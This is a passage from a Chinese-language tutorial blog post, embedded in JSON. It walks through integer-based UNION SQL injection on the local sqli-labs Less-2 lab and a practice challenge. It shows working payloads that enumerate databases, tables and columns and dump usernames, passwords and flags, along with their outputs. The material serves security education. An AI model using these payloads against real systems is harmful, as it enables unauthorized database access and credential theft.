2）拼接多组内容在同一行输出、寻找所在库</h4>\n<p>OK，我们在第二个占位符（也就是数字 2 所在的位置）上，看到输出了一个 schema_name，但是我们想要输出所有的 schema_name，怎么办？</p>\n<p>使用 MySQL 查询语句提供的 group_concat () 函数</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>可以看到，原本占位符 2 所在的位置，已经被一组输出内容所替换。</p>\n<p><img src=\"image-20220928230746841.png\" alt=\"image-20220928230746841\"></p>\n<p>除了 group_concat ()，我们还可以使用：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#输出当前使用数据库的名称</span><br><span class=\"line\">database() </span><br><span class=\"line\">#输出当前服务器中使用数据库的用户的名字和其对应的主机</span><br><span class=\"line\"><span class=\"keyword\">user</span>()</span><br><span class=\"line\">#输出当前数据库版本号</span><br><span class=\"line\">version()</span><br><span class=\"line\">#输出该服务器数据库安装路径（数据库安装在哪里）</span><br><span class=\"line\">@<span class=\"variable\">@basedir</span></span><br><span class=\"line\">#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）</span><br><span class=\"line\">@<span class=\"variable\">@datadir</span></span><br><span class=\"line\">#输出操作系统的版本号</span><br><span class=\"line\">@<span class=\"variable\">@version</span>_compile_os</span><br><span class=\"line\">#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的<span class=\"number\">32</span>位字符串。</span><br><span class=\"line\">md5(<span class=\"string\">&#x27;xxxx&#x27;</span>)</span><br><span class=\"line\">#使用某个拼接符如“:”来拼接str1和str2</span><br><span class=\"line\">concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, str1, str2)</span><br></pre></td></tr></table></figure>\n<p>接着我们查询所在数据库的名字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), database() <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>哦，原来是在 security 数据库中</p>\n<p><img src=\"image-20220928231402676.png\" alt=\"image-20220928231402676\"></p>\n<h4 id=\"3确定想从某个库中拿到什么表从表中拿到什么列\"><a class=\"markdownIt-Anchor\" href=\"#3确定想从某个库中拿到什么表从表中拿到什么列\">#</a> 3）确定想从某个库中拿到什么表，从表中拿到什么列</h4>\n<p>我们看看从 security 库中都可以读取什么表？</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Tables 表</strong>中，查询当 table_schema 的值为我们刚刚获取的 security 库时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928231639522.png\" alt=\"image-20220928231639522\"></p>\n<p><strong>获取到 security 库中的所有表为</strong>： <code>emails</code> 、 <code>referers</code> 、 <code>uagents</code> 、 <code>users</code></p>\n<p>我们比较关心账号密码相关，所以眼光聚焦到 users 表。</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Columns 表</strong>中，查询当<strong> table_schema</strong> 的值为我们刚刚获取的 <code>security</code>  且 <strong>table_name</strong> 为 <code>users</code>  时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(column_name), database() <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() <span class=\"keyword\">and</span> table_name <span class=\"operator\">=</span> <span class=\"string\">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure>\n<p><strong>获取到 security 库中，users 表里所有列为</strong>： <code>id</code> 、 <code>username</code> 、 <code>password</code></p>\n<p><img src=\"image-20220928232355430.png\" alt=\"image-20220928232355430\"></p>\n<p>我们想要获取 username 和 password 的全部对应关系，使用 concat_ws 函数，把 username 和 password 用冒号拼接起来：</p>\n<p><strong>核心</strong> —— 由于已经知道了所在<strong> security 库</strong>，<strong>users 表</strong>，因此直接 <code>select xxxx from security.users</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, username, password)), <span class=\"number\">3</span> <span class=\"keyword\">from</span> security.users #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928232842359.png\" alt=\"image-20220928232842359\"></p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>查看注入类型</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; # 报错(整型和单引号都会报错)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定整型注入</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.确定列数</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.构造联合查询,确定所在库名。</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: information_schema</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#5.确定在这个库中，都有什么表</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: emails,flag,users</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#6.确定我们要找flag表，并看这个表中有什么列</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>flag<span class=\"string\">&#x27;#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag,value</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#7.取列的值，另外把查询的from 后面改成对应的&quot;库.表&quot;</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&#x27;</span>:<span class=\"string\">&#x27;, flag, value)) from challenge.flag#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse</span></span><br></pre></td></tr></table></figure>\n<p>至此，整型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        }
    ]
}